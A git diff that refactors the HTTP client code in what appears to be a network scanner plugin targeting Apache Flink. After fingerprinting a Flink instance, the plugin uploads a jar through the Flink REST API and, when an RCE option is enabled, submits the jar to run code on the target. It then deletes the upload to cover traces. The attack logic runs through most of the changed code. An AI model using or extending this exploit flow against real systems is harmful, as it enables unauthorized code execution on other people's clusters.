@@ -1,18 +1,21 @@
 package com.gbw.scanner.plugins.scripts.web.flink;
 
 import com.gbw.scanner.Host;
+import com.gbw.scanner.http.GBWHttpClientBuilder;
+import com.gbw.scanner.http.GBWHttpResponse;
 import com.gbw.scanner.plugins.scripts.GBWScanScript;
 import com.gbw.scanner.plugins.scripts.GBWScanScriptCommonConfig;
 import com.gbw.scanner.sink.SinkQueue;
+import com.gbw.scanner.utils.HttpUtils;
 import com.google.gson.Gson;
 import com.xmap.api.utils.TextUtils;
+import org.apache.http.client.methods.HttpGet;
+import org.apache.http.client.methods.HttpUriRequest;
+import org.apache.http.impl.client.CloseableHttpClient;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
 import java.io.IOException;
-import java.net.http.HttpClient;
-import java.net.http.HttpRequest;
-import java.net.http.HttpResponse;
 
 public class GBWScanFlinkScript implements GBWScanScript {
 
@@ -35,17 +38,14 @@ public class GBWScanFlinkScript implements GBWScanScript {
         return true;
     }
 
-    private static final HttpResponse<String> send(HttpClient client,HttpRequest request) throws IOException, InterruptedException {
+    private boolean isFlink(Host host, CloseableHttpClient httpClient) {
 
-        return client.send(request, HttpResponse.BodyHandlers.ofString());
-    }
+        HttpGet request = FlinkHttpRequestBuilder.makeFirstPageRequest(host,config);
 
-    private boolean isFlink(Host host,HttpClient httpClient) throws IOException, InterruptedException {
+        GBWHttpResponse response = HttpUtils.send(httpClient,request,true);
 
-        HttpRequest request = FlinkHttpRequestBuilder.makeFirstPageRequest(host.getServer(),host.getPort(),config.getReadTimeout());
-        HttpResponse<String> response = send(httpClient,request);
+        String content = response.getContent();
 
-        String content = response.body();
         if(TextUtils.isEmpty(content))
             return false;
 
@@ -55,25 +55,32 @@ public class GBWScanFlinkScript implements GBWScanScript {
     @Override
     public void scan(Host host, SinkQueue sinkQueue) {
 
-        HttpRequest httpRequest;
-        HttpResponse<String> httpResponse;
+        HttpUriRequest httpRequest;
+        GBWHttpResponse httpResponse;
         String content;
         Gson gson = new Gson();
-        HttpClient httpClient = HttpClient.newHttpClient();
+
+        CloseableHttpClient httpClient = null;
+
+
         UPloadStatus uPloadStatus;
         String upFileName = null;
 
         try {
+
+            httpClient = GBWHttpClientBuilder.make(host.getProto(),host.getPort());
+
             if(isFlink(host,httpClient)){
 
                 log.info("Find a apache flink ip:"+host.getIp());
 
                 // try to upload jar
-                httpRequest = FlinkHttpRequestBuilder.makeUPloadJarRequest(host.getServer(),host.getPort(),config.getReadTimeout(),config.getJarFile());
+                httpRequest = FlinkHttpRequestBuilder.makeUPloadJarRequest(host,config);
 
-                httpResponse = send(httpClient,httpRequest);
-                if(httpResponse.statusCode() == 200){
-                    content = httpResponse.body();
+                httpResponse = HttpUtils.send(httpClient,httpRequest,true);
+                if(httpResponse.getStatus() == 200){
+
+                    content = httpResponse.getContent();
                     uPloadStatus = gson.fromJson(content,UPloadStatus.class);
 
                     upFileName = uPloadStatus.getFile();
@@ -90,20 +97,18 @@ public class GBWScanFlinkScript implements GBWScanScript {
                         /*exe rce*/
                         if(config.isUseRCE()){
 
-                            httpRequest = FlinkHttpRequestBuilder.makesubmitJarRequest(host.getServer(),host.getPort(),config.getReadTimeout(),upFileName,
-                                    config.getEntryClass(),config.getSubmitJson());
+                            httpRequest = FlinkHttpRequestBuilder.makesubmitJarRequest(host,config,upFileName);
 
-                            httpResponse = send(httpClient,httpRequest);
+                            httpResponse = HttpUtils.send(httpClient,httpRequest,true);
 
-                            log.warn(String.format("Exe a apache flink rce ip:%s,jar:%s,res:%s",host.getIp(),upFileName,httpResponse.body()));
+                            log.warn(String.format("Exe a apache flink rce ip:%s,jar:%s,res:%s",host.getIp(),upFileName,httpResponse.getContent()));
                         }
 
                         /*delete jar file*/
                         log.warn(String.format("Delete upload for IP:%s,jar:%s",host.getIp(),upFileName));
 
-                        httpRequest = FlinkHttpRequestBuilder.makeDeleteJarRequest(host.getServer(),host.getPort(),config.getReadTimeout(),upFileName);
-                        send(httpClient,httpRequest);
-
+                        httpRequest = FlinkHttpRequestBuilder.makeDeleteJarRequest(host,config,upFileName);
+                        HttpUtils.send(httpClient,httpRequest);
                     }
                 }
 
@@ -112,6 +117,15 @@ public class GBWScanFlinkScript implements GBWScanScript {
         }catch (Exception e){
 
             e.printStackTrace();
+        }finally {
+
+            if(httpClient!=null) {
+                try {
+                    httpClient.close();
+                } catch (IOException e) {
+                    e.printStackTrace();
+                }
+            }
         }
 
     }
